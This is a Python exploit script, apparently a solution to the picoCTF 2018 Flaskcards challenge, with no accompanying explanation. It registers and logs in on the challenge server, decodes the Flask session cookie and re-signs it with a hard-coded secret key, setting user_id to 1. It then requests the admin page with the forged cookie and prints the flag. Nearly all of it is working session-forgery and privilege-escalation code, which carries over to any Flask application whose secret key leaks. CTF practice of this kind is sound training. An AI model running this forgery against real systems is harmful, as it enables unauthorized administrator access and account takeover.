from itsdangerous import URLSafeTimedSerializer, base64_decode
from flask.sessions import session_json_serializer
from hashlib import sha1
from pwn import *
import requests
import json
import zlib
import re

URL = "http://2018shell.picoctf.com:48263"
SECRET_KEY = '385c16dd09098b011d0086f9e218a0a2'
COOKIE_NAME = "session"

class Flaskcards(object):

    def __init__(self, url):
        self.session = requests.Session()
        self.url = url
        self.username = None
        self.password = None

    def Register(self, username, password):
        log.info("Registering with username '{}', password '{}'".format(username, password))
        register_url = "{}/register".format(self.url)
        r = self.session.get(register_url)
        csrf = self._get_csrf(r.text)
        r = self.session.post(register_url, data = {"csrf_token": csrf, 'username': username, 'password': password, 'password2': password})
        assert("Successfully registered" in r.text)
        self.username = username
        self.password = password
        return r
        
        
    def Login(self):
        if self.username is None or self.password is None:
            raise Exception("Must register first!")
        username = self.username
        password = self.password
        log.info("Logging in with username '{}', password '{}'".format(username, password))
        login_url = "{}/login".format(self.url)
        r = self.session.get(login_url)
        csrf = self._get_csrf(r.text)
        r = self.session.post(login_url, data = {"csrf_token": csrf, 'username': username, 'password': password, 'remember_me': "n"})
        assert("Welcome {}!".format(username) in r.text)
        return r
    
    def GetCookie(self, name):
        return self.session.cookies[name]
        
    @staticmethod
    def _get_csrf(text):
        csrf = re.search('input id="csrf_token" name="csrf_token" type="hidden" value="([^"]+)"', text).group(1)
        return csrf
        
    
class FlaskForger(object):
    def __init__(self, secret_key):
        self.signer = URLSafeTimedSerializer(secret_key, salt='cookie-session', serializer=session_json_serializer,
                                        signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1})
    def forgeSession(self, payload):
        gen_payload = self.signer.dumps(payload)
        log.info("Generated signed cookie : {}".format(gen_payload))
        return gen_payload
        
    @classmethod
    def decodeCookiePayload(cls, session):
        start = 1 if session[0] == '.' else 0

        session_payload = session[start:].split('.')[0]
        log.info("Session data: {}".format(session_payload))
        decoded_session_payload = base64_decode(session_payload)
        decompressed_session_payload = zlib.decompress(decoded_session_payload)
        return decompressed_session_payload


flsk = Flaskcards(URL)
flsk.Register(randoms(10), randoms(10))
flsk.Login()
old_cookie_val = flsk.GetCookie(COOKIE_NAME)
log.info("Original cookie: {}".format(old_cookie_val))

forger = FlaskForger(SECRET_KEY)
decoded = FlaskForger.decodeCookiePayload(old_cookie_val)
log.info("Original cookie data: {}".format(decoded))

j = json.loads(decoded)
j["user_id"] = "1"
log.info("New cookie data: {}".format(json.dumps(j)))

new_cookie_val = forger.forgeSession(j)

cookie = {COOKIE_NAME: new_cookie_val}

r = requests.get('{}/admin'.format(URL), cookies=cookie)

for line in r.text.split("\n"):
    if "picoCTF" in line:
        print (line)